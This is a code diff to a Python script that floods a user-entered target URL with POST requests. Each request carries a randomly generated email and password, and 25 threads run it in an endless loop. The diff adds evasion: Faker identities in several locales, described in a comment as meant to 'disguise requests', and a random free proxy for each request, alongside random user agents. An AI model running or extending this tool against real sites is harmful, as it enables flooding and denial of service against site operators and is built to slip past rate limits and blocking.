@@ -1,36 +1,33 @@
 import threading
 import requests
 import random
-import string
-import names
-import subprocess
+from fp.fp import FreeProxy
 
 from fake_useragent import UserAgent
+from faker import Faker
 
+# Fake information generator from many different languages to disguise requests
+fake = Faker(['it_IT', 'en_US', 'ja_JP', 'fr_FR', 'de_DE', 'es_ES'])
 
 
 
 def name_gen():#Generates a random name for the email
-    name_system = random.choice(["FullName", "FullFirstFirstInitial", "FirstInitialFullLast"])
-    first_name = names.get_first_name()
-    last_name = names.get_last_name()
-    if name_system == "FullName":#JohnDoe
-        return first_name + last_name
-    elif name_system == "FullFirstFirstInitial":#JohnD
-        return first_name + last_name[0]
-    return first_name[0] + last_name#JDoe
+    return fake.user_name()
 
 def generate_random_email():
     name = name_gen()
     NumberOrNo=random.choice(["Number", "No"])
-    domain = random.choice(["@gmail.com", "@yahoo.com", "@rambler.ru", "@protonmail.com", "@outlook.com", "@itunes.com"])#Popular email providers
+    domain = random.choice(["@gmail.com", "@yahoo.com", "@rambler.ru", "@protonmail.com", "@outlook.com", "@itunes.com", "@hotmail.com", "@icloud.com"])#Popular email providers
     if NumberOrNo == "Number":
         return name + str(random.randint(1, 100)) + domain
     else:
         return name + domain
 
 def generate_random_password():
-    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
+    return fake.password() 
+
+def generate_proxy():
+    return FreeProxy(rand=True).get()
 
 def send_posts(url):
     while True:
@@ -40,11 +37,13 @@ def send_posts(url):
         ua = UserAgent()
         user_agent = ua.random
         headers = {'User-Agent': user_agent}
-        response = requests.post(url, data=data, headers=headers,)
-        print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, headers: {user_agent}")
+        proxy = generate_proxy()
+        response = requests.post(url, data=data, headers=headers, proxies={"http": proxy, "https": proxy})
+        print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, headers: {user_agent}, proxy: {proxy}")
 
 def main():
     url = input("Enter the URL of the target you want to flood: ")
+
     threads = [threading.Thread(target=send_posts, args=(url,), daemon=True) for _ in range(25)]
 
     for t in threads:
